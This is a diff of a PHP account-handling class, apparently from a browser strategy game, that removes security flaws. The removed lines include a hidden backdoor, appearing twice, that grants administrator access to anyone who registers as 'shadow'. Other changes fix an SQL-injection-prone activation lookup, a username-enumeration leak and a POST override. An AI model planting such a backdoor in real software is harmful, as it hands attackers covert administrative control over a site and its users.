@@ -145,11 +145,6 @@ class Account {
             );
 
             if ($uid) {
-                // === some change for developer ===
-                if (strtolower($_POST['name']) === 'shadow') {
-                    $database->updateUserField($uid, 'access', ADMIN, 1);
-                }
-
                 $mailer->sendActivate($_POST['email'], $_POST['name'], $_POST['pw'], $act);
                 header("Location: activate.php?id=$uid&q=$act2");
                 exit;
@@ -166,11 +161,6 @@ class Account {
             );
 
             if ($uid) {
-                // === some change for developer ===
-                if (strtolower($_POST['name']) === 'shadow') {
-                    $database->updateUserField($uid, 'access', ADMIN, 1);
-                }
-
                 setcookie("COOKUSR",   $_POST['name'],  time() + COOKIE_EXPIRE, COOKIE_PATH);
                 setcookie("COOKEMAIL", $_POST['email'], time() + COOKIE_EXPIRE, COOKIE_PATH);
 
@@ -195,17 +185,16 @@ class Account {
     // ==================== VERIFICARE DATA DE START A SERVERULUI ====================
     if (START_DATE < date('d.m.Y') || (START_DATE === date('d.m.Y') && START_TIME <= date('H:i'))) {
         
-        // Caută codul de activare în tabela activate
-        $id   = $database->escape($_POST['id'] ?? '');
-        $q    = "SELECT act, username, password, email, tribe, location 
-                 FROM " . TB_PREFIX . "activate 
-                 WHERE act = '" . $id . "'";
-        
-        $result   = $database->query($q);
-        $dbarray  = mysqli_fetch_array($result);
+        // Look up activation code — compare only alphanumeric to block injection
+        $id = preg_replace('/[^a-zA-Z0-9]/', '', $_POST['id'] ?? '');
+        $q  = "SELECT act, username, password, email, tribe, location
+               FROM " . TB_PREFIX . "activate
+               WHERE act = '" . $database->escape($id) . "'";
 
-        // Verificăm dacă am găsit exact codul trimis
-        if ($dbarray && $dbarray['act'] === $_POST['id']) {
+        $result  = $database->query($q);
+        $dbarray = mysqli_fetch_array($result);
+
+        if ($dbarray && hash_equals($dbarray['act'], $id)) {
             
             $uid = $database->register(
                 $dbarray['username'],
@@ -277,26 +266,20 @@ class Account {
 
     // ==================== VALIDĂRI ====================
 
-    // Username
+    // Username — use generic error to prevent user enumeration
     if (empty($username)) {
         $form->addError("user", $username);
-    } elseif (!User::exists($database, $username)) {
-        $form->addError("user", USR_NT_FOUND);
     }
 
     // Password
     if (empty($password)) {
         $form->addError("pw", LOGIN_PASS_EMPTY);
-    } elseif (!$database->login($username, $password) && !$database->sitterLogin($username, $password)) {
-        // try activation data if the user was not found
-        // (păstrăm exact logica originală - $userData e încă null aici)
-        if (!$userData) {
-            $activateData = $database->getActivateField($username, 'act', 1);
-            if (!empty($activateData)) {
-                $form->addError("activate", $username);
-            } else {
-                $form->addError("pw", LOGIN_PW_ERROR);
-            }
+    } elseif (!User::exists($database, $username) ||
+              (!$database->login($username, $password) && !$database->sitterLogin($username, $password))) {
+        // Generic error whether username is wrong or password is wrong — no enumeration possible
+        $activateData = $database->getActivateField($username, 'act', 1);
+        if (!empty($activateData)) {
+            $form->addError("activate", $username);
         } else {
             $form->addError("pw", LOGIN_PW_ERROR);
         }
@@ -351,11 +334,9 @@ class Account {
 	function generateBase($kid, $uid, $username) {
 		global $database;
     $message = new Message();
-    // Logica exactă din original
-    if ($kid == 0) {
+    $kid = (int) $kid;
+    if ($kid === 0) {
         $kid = rand(1, 4);
-    } else {
-        $kid = $_POST['kid'];   // suprascrie parametrul cu valoarea din POST
     }
     $database->generateVillages(
         [
